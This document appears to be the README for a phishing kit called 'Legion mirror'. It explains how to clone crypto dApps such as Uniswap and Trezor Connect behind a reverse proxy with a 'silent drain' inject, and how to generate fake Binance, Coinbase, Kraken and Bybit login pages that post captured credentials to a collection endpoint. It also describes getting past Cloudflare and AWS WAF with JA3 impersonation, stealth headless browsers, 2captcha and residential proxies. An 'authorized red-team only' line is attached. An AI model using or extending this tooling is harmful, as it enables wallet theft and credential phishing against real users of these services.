# Hard Targets — Mirror Toolkit Limitations & Playbook

Authorized red-team research only. This document explains what the Legion mirror toolkit can and cannot do against heavily protected sites (Cloudflare, AWS WAF, Tier-S exchanges).

## Quick Reference

| Target type | Recommended command | Why |
|-------------|---------------------|-----|
| Simple dApp (Uniswap, Trezor Connect) | `pnpm clone-tunnel --god-mode https://app.uniswap.org` | Live reverse proxy + silent drain inject |
| Cloudflare SPA (moderate) | Same + `TWOCAPTCHA_API_KEY` + headless fallback (god-mode default) | Probe → headless → cookie retry |
| CEX login (Binance, Coinbase, Kraken, Bybit) | Auto-switches to `cex-clone` | Live proxy cannot bypass exchange WAF; credential capture is the supported path |
| Force raw mirror (advanced) | `pnpm clone-tunnel --god-mode --force <url>` | Skips CEX auto-detection and WAF abort |

## Architecture

```
clone-deploy-tunnel
  ├─ CEX domain / login-form detected?  → generate-cex-login-page (static)
  ├─ WAF probe (JA3 / fetch / proxy)
  │    └─ Challenge? → headless capture (puppeteer-extra + stealth)
  │         └─ Turnstile? → 2captcha (TWOCAPTCHA_API_KEY)
  │         └─ Export cookies → mirror-session-cookies.txt
  ├─ Retry probe with cookies
  ├─ Still blocked + CEX-like? → cex-clone fallback
  └─ generate-phishing-page → nginx reverse proxy + Legion inject
```

## WAF Detection Signals

The probe treats these as **challenge responses** (not success):

- HTTP **403**, **429**, **503**
- HTTP **202** with body **< 1024 bytes** (empty/placeholder)
- Body contains: `cf-challenge`, `turnstile`, `captcha`, `gokuProps`, `just a moment`, etc.

When detected, the orchestrator automatically attempts **headless capture** before giving up.

## Environment Variables

```bash
# Turnstile / CAPTCHA solving (optional but recommended for Cloudflare)
TWOCAPTCHA_API_KEY=

# Headless browser navigation timeout (ms, default 90000)
HEADLESS_TIMEOUT=90000

# Session cookies from headless capture — injected into nginx upstream requests
MIRROR_PROXY_COOKIES=

# Force raw mirror generation (set by --force flag)
MIRROR_FORCE_RAW=true

# JA3 Chrome impersonation for upstream fetch (god-mode sets CLONE_JA3_CHROME)
CLONE_JA3_CHROME=true
MIRROR_WAF_BYPASS=true
```

## Known Limitations

### Binance / Tier-S CEX

- **Live reverse proxy will not work** for authenticated exchange sessions — Cloudflare + device fingerprinting + HttpOnly cookies on the real domain.
- **Supported approach:** `cex-clone` generates a static login page with credential + session metadata capture to `POST /api/v1/creds`.
- Cookies captured on the **clone domain** are not the victim's exchange HttpOnly cookies unless you reverse-proxy through the real domain (not implemented).

### Cloudflare

- **Best effort:** JA3 fetch + browser headers + headless + 2captcha Turnstile.
- **Not guaranteed:** Managed rules, bot scores, and TLS fingerprint rotation can still block datacenter IPs.
- **Mitigation:** Residential proxy pool (`PROXY_POOL`), VPS with clean IP, `TWOCAPTCHA_API_KEY`.

### AWS WAF (`gokuProps`)

- Detected as challenge; headless + captcha may help on some configs.
- Many AWS WAF rules require human interaction that automation cannot complete.

### Cookie Injection

- Headless-exported cookies are forwarded via `proxy_set_header Cookie` in nginx for **subsequent proxied requests**.
- Cookies expire quickly; regeneration requires re-running headless capture.

## Troubleshooting

| Symptom | Fix |
|---------|-----|
| `subdomainProxyBlock is not defined` | Fixed in `training-clone-features.ts` — update to latest |
| Empty 202 response | WAF challenge — ensure puppeteer deps installed |
| `pnpm clone-tunnel` exits on WAF | Expected for hard targets; use cex-clone or `--force` |
| Headless fails | `pnpm add -D puppeteer puppeteer-extra puppeteer-extra-plugin-stealth` |
| 2captcha timeout | Check balance / API key; increase `HEADLESS_TIMEOUT` |

## Backward Compatibility

Sites that worked before (Uniswap, Trezor, simple SPAs) continue to use the standard god-mode path:

- No CEX domain match → mirror mode
- WAF probe passes → no headless needed
- `subdomainProxyBlock` restored for production clone subdomain passthrough

## Legal

Use only on systems you own or have **explicit written authorization** to test. Credential capture and wallet drain tooling is for authorized red-team research infrastructure only.
